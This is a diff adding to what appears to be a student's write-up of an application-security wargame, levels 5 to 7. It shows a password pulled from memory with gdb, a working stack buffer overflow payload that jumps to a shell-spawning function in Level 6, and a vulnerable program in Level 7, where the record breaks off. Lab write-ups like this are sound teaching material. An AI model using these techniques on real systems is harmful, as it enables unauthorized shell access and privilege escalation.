@@ -139,4 +139,247 @@ Run this command:
 Win!
 
 # Level 5 
-Boom
+There is a static file "password.h", we cannot access the file directly. Therefore we must dump it from memory.
+Looking at the source code
+```
+#include <stdio.h>
+#include <unistd.h>
+
+#include "password.h"
+
+int main(int argc, char* argv[]) {
+    if(argc < 2)
+        return 1;
+    char* correct_pwd = get_password();
+    int result = strcmp(correct_pwd, argv[1]);
+    free(correct_pwd);
+    if(result == 0) {
+        printf("Authenticated\n");
+        execl("/bin/sh", "/bin/sh", (char*)NULL);
+    }
+    else {
+        printf("Wrong password\n");
+    }
+    return 0;
+}
+```
+correct_pwd should store a pointer to the string with the correct password. It is free'd, therefore it should be heap allocated.
+We will need to access the password before it is freed- therefore, we can set a breakpoint on strcmp, and look at which characters are being compared.
+
+```
+gdb) break strcmp
+Breakpoint 2 at 0x7ffff7da7240: strcmp. (2 locations)
+```
+
+Executing until it hits the breakpoint:
+```
+(gdb) continue
+Continuing.
+Breakpoint 2.1, __strcmp_sse42 () at ../sysdeps/x86_64/multiarch/strcmp-sse4_2.S:108
+warning: 108    ../sysdeps/x86_64/multiarch/strcmp-sse4_2.S: No such file or directory
+(gdb) frame
+#0  __strcmp_sse42 () at ../sysdeps/x86_64/multiarch/strcmp-sse4_2.S:108
+108     in ../sysdeps/x86_64/multiarch/strcmp-sse4_2.S
+(gdb) backtrace
+#0  __strcmp_sse42 () at ../sysdeps/x86_64/multiarch/strcmp-sse4_2.S:108
+#1  0x00005555555552ac in main ()
+```
+This should be the correct strcmp call. Therefore, we will take a look at the current call stack. The first argument to the function should be our target. The first argument is stored in `$rdi` register on x86-64, therefore we can simply dump the string at that address to retrieve the password
+```
+SuperVerySecretPassword
+```
+Then call escalate. Win
+
+# Level 6
+Looking at the source code
+```
+#include <stdlib.h>
+#include <unistd.h>
+#include <string.h>
+
+void do_it()
+{
+  execl("/bin/bash", "/bin/bash", (char*)NULL);
+}
+
+int main(int argc, char **argv)
+{
+  char yo[128];
+
+  // I am sure that this function will be useful one day.
+  // For now I will just print its address, so that I don't lose it.
+  printf("%p\n", &do_it);
+
+  gets(yo);
+  // Maybe I should also do something with this content?
+  // Let's leave it for later, I am sure that I will finish this hobby project, 
+  // unlike the other 10 that I have started this month.
+```
+
+They print the address of do_it, seems like we need to redirect the RIP to the do_it address
+yo can only take in 128 characters, maybe we can overwrite the RIP?
+
+Using input `4141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141`
+
+we get a segfault, this means we get a buffer overflow (memory corruption)
+
+We should probably take a look at what the memory looks like
+Dumping the assembly we get:
+```
+students24@appsec2026:/levels/level6$ objdump -d ./level6
+
+./level6:     file format elf64-x86-64
+
+........
+
+0000000000001189 <do_it>:
+    1189:       f3 0f 1e fa             endbr64
+    118d:       55                      push   %rbp
+    118e:       48 89 e5                mov    %rsp,%rbp
+    1191:       ba 00 00 00 00          mov    $0x0,%edx
+    1196:       48 8d 05 67 0e 00 00    lea    0xe67(%rip),%rax        # 2004 <_IO_stdin_used+0x4>
+    119d:       48 89 c6                mov    %rax,%rsi
+    11a0:       48 8d 05 5d 0e 00 00    lea    0xe5d(%rip),%rax        # 2004 <_IO_stdin_used+0x4>
+    11a7:       48 89 c7                mov    %rax,%rdi
+    11aa:       b8 00 00 00 00          mov    $0x0,%eax
+    11af:       e8 dc fe ff ff          call   1090 <execl@plt>
+    11b4:       90                      nop
+    11b5:       5d                      pop    %rbp
+    11b6:       c3                      ret
+
+00000000000011b7 <main>:
+    11b7:       f3 0f 1e fa             endbr64
+    11bb:       55                      push   %rbp                   <---- PUSH RBP ON STACK
+    11bc:       48 89 e5                mov    %rsp,%rbp              <---- SAVE STACK PTR INTO RBP
+    11bf:       48 81 ec 90 00 00 00    sub    $0x90,%rsp             <---- CLEAR ROOM FOR UTILIZATION
+    11c6:       89 bd 7c ff ff ff       mov    %edi,-0x84(%rbp)
+    11cc:       48 89 b5 70 ff ff ff    mov    %rsi,-0x90(%rbp)
+    11d3:       48 8d 05 af ff ff ff    lea    -0x51(%rip),%rax        # 1189 <do_it>
+    11da:       48 89 c6                mov    %rax,%rsi
+    11dd:       48 8d 05 2a 0e 00 00    lea    0xe2a(%rip),%rax        # 200e <_IO_stdin_used+0xe>
+    11e4:       48 89 c7                mov    %rax,%rdi
+    11e7:       b8 00 00 00 00          mov    $0x0,%eax
+    11ec:       e8 7f fe ff ff          call   1070 <printf@plt>
+    11f1:       48 8d 45 80             lea    -0x80(%rbp),%rax      <----- LOAD BUFFER INPUT ONTO STACK 
+    11f5:       48 89 c7                mov    %rax,%rdi
+    11f8:       b8 00 00 00 00          mov    $0x0,%eax
+                                                                     <----- Call will have saved the rip to the next instruction
+    11fd:       e8 7e fe ff ff          call   1080 <gets@plt>
+    1202:       b8 00 00 00 00          mov    $0x0,%eax
+    1207:       c9                      leave
+    1208:       c3                      ret
+```
+
+The buffer starts at rbp-0x80 (lea    -0x80(%rbp),%rax)
+
+We can assume that our stack looks something like this:
+```
+┌─────────────────────┐  <- rsp / buffer start (rbp-0x80)
+│   buffer (128 bytes)│
+│                     │
+├─────────────────────┤  <-  rbp
+│  saved RBP (8 bytes)│
+├─────────────────────┤  <- rbp+8
+│  saved RIP (8 bytes)│  
+└─────────────────────┘
+```
+Therefore we need to overwrite 136 bytes + address we want to access:
+`perl -e 'print "A"x136 ."BBBBBBBB"' | ./level6`
+
+We can execute using gdb to see what's happening
+```
+(gdb) run < <(perl -e 'print "A"x136 . "\x89\x51\x55\x55\x55\x55\x00\x00"')
+Starting program: /levels/level6/level6 < <(perl -e 'print "A"x136 . "\x89\x51\x55\x55\x55\x55\x00\x00"')
+warning: Probes-based dynamic linker interface failed.
+Reverting to original interface.
+[Detaching after fork from child process 130195]
+process 130192 is executing new program: /levels/level6/level6
+[Thread debugging using libthread_db enabled]
+Using host libthread_db library "/lib/x86_64-linux-gnu/libthread_db.so.1".
+0x555555555189
+
+Program received signal SIGSEGV, Segmentation fault.
+0x0000555555551189 in ?? ()
+(gdb) info registers rip
+rip            0x555555551189      0x555555551189
+(gdb) 
+``` Accidentally put in the wrong addy. Fixing it gives:
+
+```Using host libthread_db library "/lib/x86_64-linux-gnu/libthread_db.so.1".
+0x555555555189
+process 130206 is executing new program: /usr/bin/bash
+[Thread debugging using libthread_db enabled]
+Using host libthread_db library "/lib/x86_64-linux-gnu/libthread_db.so.1".
+process 130206 is executing new program: /usr/bin/bash.orig
+warning: could not find '.gnu_debugaltlink' file for /lib/x86_64-linux-gnu/libtinfo.so.6
+[Thread debugging using libthread_db enabled]
+Using host libthread_db library "/lib/x86_64-linux-gnu/libthread_db.so.1".
+[Inferior 1 (process 130206) exited normally]
+```
+
+So we fixed our payload!
+Executing normally (using cat to keep stdin open!):
+```
+(perl -e 'print "A"x136 . "\x89\x51\x55\x55\x55\x55\x00\x00"'; cat) | ./level6
+```
+We can now call escalate.
+
+# Level 7
+Root:
+```
+students24@appsec2026:/levels/level7$ ls -la
+total 32
+dr-xr-x---  2 root level6  4096 Mar 17 09:49 .
+dr-xr-xr-x 12 root root    4096 Mar 17 09:49 ..
+-r-xr-sr-x  1 root level7 16328 Mar 17 09:49 level7
+-r--r-----  1 root level6   907 Mar 17 09:48 level7.c
+-r--r-----  1 root level7   395 Mar 17 09:48 special.h
+```
+
+```
+students24@appsec2026:/levels/level7$ cat level7.c
+#include <stdio.h>
+#include <stdlib.h>
+#include <unistd.h>
+#include <time.h>
+#include <string.h>
+
+#include "special.h"
+
+
+int main(){
+        int* myvalue = (int*) malloc(sizeof(int));
+        *myvalue = special_value();
+        int final = 0;
+
+        printf("Can you please help me solve a difficult problem?\n");
+        srand(time(NULL));
+        int x = rand() % 10;
+        int y = rand() % 10;
+        printf("%d * %d = ?\n", x, y);
+        int inputnumber = 0;
+        scanf("%d", &inputnumber);
+        if (inputnumber != x*y){
+                printf("Maybe you should study Math instead of Security...\n");
+                return 1;
+        }
+
+
+        printf("You are very good at maths!\nEnter your username: ");
+        char name[16];
+        scanf("%s", &name);
+
+        if (final == *myvalue){
+                printf("You solved another problem today!\n");
+                execl("/bin/sh", "/bin/sh", (char*)NULL);
+        }
+
+        else {
+                printf("Congratulations to %s for being so good at maths! But you need to do a bit more for Security...\n", name);
+        }
+
+        return 0;
+}
+```
+
+Looking at the ASM...
